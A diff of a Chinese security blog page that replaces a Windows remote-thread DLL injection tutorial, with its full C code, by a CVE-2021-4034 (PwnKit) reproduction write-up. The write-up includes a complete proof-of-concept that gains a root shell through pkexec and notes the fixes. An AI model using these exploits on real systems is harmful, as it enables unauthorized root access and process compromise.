@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>远程线程注入(系统进程) | 九世的博客</title>
-  <meta name="keywords" content=" 红队 ">
-  <meta name="description" content="远程线程注入(系统进程) | 九世的博客">
+  <title>pkexec提权漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="pkexec提权漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1928,9 +1928,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-远程线程注入-系统进程" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-pkexec提权漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">远程线程注入(系统进程)</h1>
+        <h1 class="article-title">pkexec提权漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -1939,14 +1939,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">红队</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-03-15 00:07:12">2021-03-14 23:57</time>
+        创建时间:<time class="date" title="更新时间: 2022-01-28 17:17:37">2022-01-28 17:04</time>
         
     </div>
     <div class="article-meta">
@@ -1968,7 +1968,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的API函数"><span class="toc-text">用到的API函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用条件"><span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞修复"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1983,112 +1983,56 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p>
-<h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p>
-<ul>
-<li>OpenProcess</li>
-<li>VirtualAllocEx</li>
-<li>WriteProcessMemory</li>
-<li>CreateRemoteThread</li>
-</ul>
-<p>特权开启：</p>
-<ul>
-<li>OpenProcessToken</li>
-<li>LookupPrivilegeValueA</li>
-<li>AdjustTokenPrivileges</li>
-</ul>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p>
-<pre><code class="C">bool EnbalePrivileges() {
-        HANDLE hToken = NULL;
-        LUID luidValue = { 0 };
-        TOKEN_PRIVILEGES tp = { 0 };
-        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);
-        if (wdret == NULL) {
-               errorprint(&quot;OpenProcessToken&quot;);
-        }
-        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称
-        if (privilege == false) {
-               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);
-        }
-        tp.PrivilegeCount = 1;
-        tp.Privileges[0].Luid = luidValue;
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭
-        if (bRet == false) {
-               errorprint(&quot;Enable Privilege Failure\n&quot;);
-        }
-        if (GetLastError() == ERROR_SUCCESS) {
-               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);
-        }
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞，允许非特权用户获取root权限。根据作者的发布文章说，在默认安装的Ubuntu、Debian、Fedora和CentOS上都已经成功复现。这个漏洞已经隐藏了12年多，并影响自2009年5月第一个版本以来的所有pkexec版本：（commit c8c3d83，“Add a pkexec(1) command”）<br><img src="https://s4.ax1x.com/2022/01/28/7x4Dte.png" alt=""></p>
+<h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.存在pkexec命令<br>2.pkexec在suid里<br><img src="https://s4.ax1x.com/2022/01/28/7x5q8H.png" alt=""></p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>全”环境变量（例如 LD_PRELOAD）放在 pkexec 的 环境; 如果是正常设置环境变量，这些“不安全”变量通常会被删除（通过 ld.so），如GCONV_PATH就是不安全的环境变量，因为他会导致任意so执行。同时pkexec是一个默认具有suid<br>属性的程序，如果能让其执⾏命令，那么就能导致suid提权了。所以利⽤中允许我们绕过过滤写⼊GCONV_PATH，然后设置gconv-modules文件，触发字符集转换，调用iconv_open加载对应字符集的so文件。</p>
+<p>534行：for循环argc=0，所以不会进入循环，但n已经设置成1<br>610行：argv[1]赋值给path<br><img src="https://s4.ax1x.com/2022/01/28/7xIBzd.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIrQA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIfJg.png" alt=""></p>
+<p>因为argv和envp指针在内存中是连续的，如果argc为0，那么越界argv[1]实际上是envp[0]<br><img src="https://s4.ax1x.com/2022/01/28/7xIbwV.png" alt=""></p>
+<p>如果按照上面的代码逻辑，如果传⼊的命令不是绝对路径，就会在 PATH 环境变量的目录搜索，在赋<br>值回argv</p>
+<p>假设我们执行pkexec，此时argc=0，envp={“xxx”}<br>610行，程序会读取argv[1]到path变量中，也就是”xxx”<br>632行，s = g_find_program_in_path (path)找到该程序的绝对路径，假设为/usr/bin/xxx<br>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp也就变成了{“/usr/bin/xxx”}<br><img src="https://s4.ax1x.com/2022/01/28/7xoAYD.png" alt=""></p>
+<p>根据找到的函数进行寻找利用：<br>在pkexec中多次使用了g_printerr()函数，该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。<br>iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。<br>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p>
+<p><strong>argv[n] = path=s就能重新触发环境变量加载，因为g_printerr()将会调用glibc的函数iconv_open()利用环境变量重新定义了GCONV_PATH，最后找到自己定义的so。加载了gconv_init函数，最后由于又是SUID权限实现了提权其实就是类似于DLL劫持</strong></p>
+<p>CVE-2021-4034</p>
+<pre><code class="c">/*
+* Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;
+* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+
+char *shell =
+    &quot;#include &lt;stdio.h&gt;\n&quot;
+    &quot;#include &lt;stdlib.h&gt;\n&quot;
+    &quot;#include &lt;unistd.h&gt;\n\n&quot;
+    &quot;void gconv() {}\n&quot;
+    &quot;void gconv_init() {\n&quot;
+    &quot;    setuid(0); setgid(0);\n&quot;
+    &quot;    seteuid(0); setegid(0);\n&quot;
+    &quot;    system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh\&quot;);\n&quot;
+    &quot;    exit(0);\n&quot;
+    &quot;}&quot;;
+
+
+int main(int argc, char *argv[]) {
+    FILE *fp;
+    system(&quot;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&quot;);
+    system(&quot;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&quot;);
+    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);
+    fprintf(fp, &quot;%s&quot;, shell);
+    fclose(fp);
+    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);
+    char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };
+    execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);
 }
 </code></pre>
-<p>完整代码</p>
-<pre><code class="C">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}
-bool EnbalePrivileges() {
-        HANDLE hToken = NULL;
-        LUID luidValue = { 0 };
-        TOKEN_PRIVILEGES tp = { 0 };
-        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);
-        if (wdret == NULL) {
-               errorprint(&quot;OpenProcessToken&quot;);
-        }
-        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);
-        if (privilege == false) {
-               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);
-        }
-        tp.PrivilegeCount = 1;
-        tp.Privileges[0].Luid = luidValue;
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);
-        if (bRet == false) {
-               errorprint(&quot;Enable Privilege Failure\n&quot;);
-        }
-        if (GetLastError() == ERROR_SUCCESS) {
-               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);
-        }
-}
-int main()
-{
-        int pid = 1148;
-        EnbalePrivileges();
-        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;
-        int dllnamesize = strlen(dllname) * 2;
-        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-        if (pidmodule == NULL) {
-               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());
-               return 1;
-        }
-        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);
-        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);
-        if (vaeAddr == NULL) {
-               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());
-               return 1;
-        }
-        printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);
-        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {
-               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());
-               return 1;
-        }
-        printf(&quot;WriteProcessMemory Sucess\n&quot;);
-        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);
-        if (loadaddress == NULL) {
-               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());
-               return 1;
-        }
-        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);
-        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);
-        if (runthread == NULL) {
-               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());
-        }
-        printf(&quot;CreateRemoteThread Sucess\n&quot;);
-        system(&quot;pause&quot;);
-    return 0;
-}
-</code></pre>
-<p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>
+<p><img src="https://s4.ax1x.com/2022/01/28/7xo3tS.png" alt=""></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
+<li>新版pkexec已修复了漏洞 (更新pkexec)<br><img src="https://s4.ax1x.com/2022/01/28/7xot6s.png" alt=""></li>
+<li>取消pkexec SUID权限</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://saucer-man.com/information_security/876.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/876.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2098,12 +2042,12 @@ int main()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>远程线程注入(系统进程)</p>
+    <p><span class="copy-title">文章标题:</span>pkexec提权漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-03-14, 23:57:27</p>
-    <p><span class="copy-title">最后更新:</span>2021-03-15, 00:07:12</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b76f927c.html" title="远程线程注入(系统进程)">http://422926799.github.io/posts/b76f927c.html</a>
+    <p><span class="copy-title">发布时间:</span>2022-01-28, 17:04:55</p>
+    <p><span class="copy-title">最后更新:</span>2022-01-28, 17:17:37</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2b1cd54.html" title="pkexec提权漏洞复现">http://422926799.github.io/posts/2b1cd54.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
